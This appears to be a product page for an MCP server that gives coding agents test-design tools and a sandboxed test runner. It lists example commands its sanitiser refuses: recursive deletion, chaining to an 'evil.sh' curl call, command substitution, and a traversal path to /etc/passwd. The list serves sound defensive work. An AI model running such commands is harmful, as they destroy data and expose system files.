Universal QA Expert Engine MCP Skill

Your coding agent can already run the test suite. It can’t design one. This server gives it the methodology — boundary analysis, equivalence partitioning, decision tables, state machines — and a sandbox to execute in.

$ npx -y mcp-qa-expert-engine
Add to your agent

Why not just ask the agent?

You can. The results depend entirely on how rigorously you phrase the request, and they change every time you ask. Three things shift when the methodology is a tool schema instead of a prompt.

Consistent rigour
A schema can’t forget the upper boundary. Every call produces the same classes of case — min, max, the values either side, type violations, null states — whoever is driving and however they phrase it.
Works in every editor
Built on the open Model Context Protocol, so the same QA behaviour runs in Claude Code, Cursor, VS Code, Antigravity and Codex. Nothing is tied to one vendor’s execution loop.
A guarded path to your shell
Test commands routed through this server are tokenised and run without a shell, confined to the workspace. Injection and directory traversal are refused before anything executes.

Add it to your agent

One block of JSON. There is nothing to install first — npx fetches the package on first run and your agent starts it over stdio.

claude_config.json 
{
  "mcpServers": {
    "qa-expert": {
      "command": "npx",
      "args": ["-y", "mcp-qa-expert-engine"]
    }
  }
}

Where that file lives

  • Claude Code Run claude mcp add, or edit the MCP block in your settings file.
  • Cursor Settings › MCP › Add new server, or .cursor/mcp.json in the project.
  • VS Code .vscode/mcp.json, or the MCP panel in your AI extension.
  • Codex & Antigravity Any MCP-compatible client reads the same mcpServers shape.
Restart the editor after saving. The server reports eight tools on connect.

Prefer a pinned version? Use "args": ["-y", "mcp-qa-expert-engine@1.1.0"].

Eight tools, grouped by when you reach for them

Your agent picks the right one from the schema. Parameters marked required must be supplied; the rest have sensible defaults.

Run it and read the wreckage

run_local_test_suite

Runs your suite and hands back status, exit code, duration and the full output. A failing suite comes back as a readable result your agent can diagnose, not a crash. Bounded at five minutes and 10 MB.

command
required

parse_error_logs

Turns a raw stack trace into a defect record: error class, severity, the first frame that is actually your code, environment details pulled from the log, repro steps and fix suggestions. Can render straight to Jira markup.

Plan the programme

generate_test_strategy

Reads your project context — domain, scale, compliance regime — and writes the strategy: pyramid allocation, which test types at what cadence, a non-functional plan covering load through accessibility, release gates, CI policy, exit criteria, closure metrics, and an honest statement of what it does not cover.

projectContext
required

What it will refuse to run

run_local_test_suite executes real commands on your machine, so it is the one tool with teeth. Commands are tokenised into an argument array and run with no shell at all, which makes injection structurally impossible rather than filtered. A sanitiser still runs first.

Refused before anything executes

  • ×npm test; rm -rf /shell metacharacter
  • ×npm test && curl evil.shcommand chaining
  • ×npm test $(whoami)substitution
  • ×sudo rm -rf .destructive token
  • ×pytest ../../etc/passwdescapes the workspace

Permitted runners

npm · npx · yarn · pnpm · bun · node · python · python3 · pytest · jest · vitest · mocha · playwright · cypress

  • Paths confined to the workspace, symlinks resolved.
  • Five minute timeout, 10 MB output buffer.
  • Subprocess output is captured, never piped to the protocol stream.

To be precise about the boundary: these rules govern commands routed through this server. They are not a sandbox around your agent — if it has its own shell access, that is unaffected. What they guarantee is that QA execution requested through these tools cannot be turned into arbitrary shell execution.

Before you install

Runtime

Node.js 18 or newer. Nothing else to install — the package ships one dependency, the MCP SDK.

Clients

Any MCP-compatible editor: Claude Code, Cursor, VS Code, Antigravity, Codex.

Workspace

Start the server from your project root. That directory becomes the boundary every path is checked against.

Verification

105 checks cover the protocol, all eight tools, and every injection and traversal case shown above.

If the server doesn’t appear

  • No tools listed. Restart the editor — most clients only read MCP config at startup.
  • Command not found. Check node --version reports 18 or higher and that npx is on your PATH.
  • A command was refused. That is the sanitiser. Send a single runner invocation with no chaining or redirection.
  • Want to see it directly? Run npx -y mcp-qa-expert-engine in a terminal; it reports the tool count on stderr and waits for JSON-RPC on stdin.
